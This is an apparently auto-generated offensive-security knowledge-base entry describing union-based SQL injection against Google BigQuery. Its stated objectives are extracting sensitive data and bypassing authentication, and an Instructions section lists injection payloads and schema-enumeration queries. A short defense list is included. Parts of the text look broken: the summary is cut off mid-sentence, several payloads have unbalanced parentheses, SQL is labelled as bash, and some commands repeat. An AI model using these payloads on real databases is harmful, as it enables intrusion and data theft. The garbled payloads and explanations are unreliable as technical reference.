---
id: b180d8fa-9b55-4a7c-9808-324c413f8016
name: BigQuery Union-Based SQL Injection
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:32.365705+00:00'
updated_at: '2023-04-10T20:21:05.505754+00:00'
tags:
- '[[BigQuery Union Based]]'
- '[[Google BigQuery SQL Injection]]'
commands:
- '[[Extracting column_name from project_id.dataset_name.table_name]]'
- '[[Performing GROUP BY operation on column_name]]'
- '[[Performing GROUP BY operation on column_name]]'
- '[[Performing LIMIT operation on result]]'
- '[[Performing UNION ALL SELECT operation with column_name and 1]]'
- '[[Performing UNION ALL SELECT operation with @@project_id]]'
- '[[Performing UNION ALL SELECT operation with @@project_id and ''asd'']]'
---

# BigQuery Union-Based SQL Injection

## Summary

BigQuery Union-Based SQL Injection is a technique used by attackers to extract sensitive information from Google BigQuery databases. This technique involves injecting malicious SQL code into the BigQuery SQL query to extract data from multiple tables using the 'union all select' command. The attack

## Description

# Description

BigQuery Union-Based SQL Injection is a technique used by attackers to extract sensitive information from Google BigQuery databases. This technique involves injecting malicious SQL code into the BigQuery SQL query to extract data from multiple tables using the 'union all select' command. The attacker can use this technique to bypass authentication and authorization mechanisms and access sensitive data. BigQuery Union-Based SQL Injection can be used in conjunction with other attack techniques such as spear-phishing to increase the chances of success. 

From a technical perspective, this attack works by injecting SQL code into a query to extract data from multiple tables. The attacker can use the 'union all select' command to retrieve data from one table and then use the same command to retrieve data from another table. This allows the attacker to extract sensitive data from multiple tables in the database. 

From a business perspective, this attack can be used to steal sensitive data such as customer information, financial data, and intellectual property. This can result in reputational damage, financial loss, and legal liabilities for the victim organization.

## Requirements

1. Access to the target Google BigQuery database

1. Knowledge of SQL injection techniques

1. Access to a tool that can inject SQL code into the query

## Defense

1. Implement input validation and sanitization techniques to prevent SQL injection attacks

1. Enforce least privilege access control to limit the amount of data that can be accessed by attackers

1. Monitor database activity for suspicious behavior and unauthorized access attempts

## Objectives

1. Extract sensitive data from Google BigQuery databases

1. Bypass authentication and authorization mechanisms

# Instructions

1. This command retrieves data from multiple tables using the UNION ALL SELECT statement. The command takes the following arguments:
1. @@project_id: The ID of the project that the tables are located in.
2. column_name: The name of the column to retrieve data from.
3. dataset_name: The name of the dataset that the tables are located in.
4. table_name: The name of the table to retrieve data from.

Example usage: UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
' GROUP BY column_name UNION ALL SELECT column_name,1,1 FROM (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name#

**Code**: [[UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1]]

> This command is used to combine the results of multiple SELECT statements into a single result set. The UNION ALL keyword is used to combine the results of the SELECT statements, and the SELECT statement within the parentheses is used to retrieve data from the specified tables. The GROUP BY clause is used to group the results by the specified column_name. The LIMIT clause is used to limit the number of results returned. The command also includes additional clauses for retrieving data from specific tables and projects.

**Command** ([[Extracting column_name from project_id.dataset_name.table_name]]):

```bash
SELECT column_name FROM project_id.dataset_name.INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'table_name'
```

**Command** ([[Performing UNION ALL SELECT operation with @@project_id and 'asd']]):

```bash
UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name
```

**Command** ([[Performing UNION ALL SELECT operation with @@project_id]]):

```bash
UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name
```

**Command** ([[Performing GROUP BY operation on column_name]]):

```bash
GROUP BY column_name
```

**Command** ([[Performing LIMIT operation on result]]):

```bash
LIMIT 1
```

**Command** ([[Performing UNION ALL SELECT operation with column_name and 1]]):

```bash
UNION ALL SELECT column_name,1,1 FROM (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name
```

**Command** ([[Performing GROUP BY operation on column_name]]):

```bash
GROUP BY column_name
```

## Commands Used

- [[Extracting column_name from project_id.dataset_name.table_name]]
- [[Performing GROUP BY operation on column_name]]
- [[Performing GROUP BY operation on column_name]]
- [[Performing LIMIT operation on result]]
- [[Performing UNION ALL SELECT operation with column_name and 1]]
- [[Performing UNION ALL SELECT operation with @@project_id]]
- [[Performing UNION ALL SELECT operation with @@project_id and 'asd']]

## Tags

- [[BigQuery Union Based]]
- [[Google BigQuery SQL Injection]]
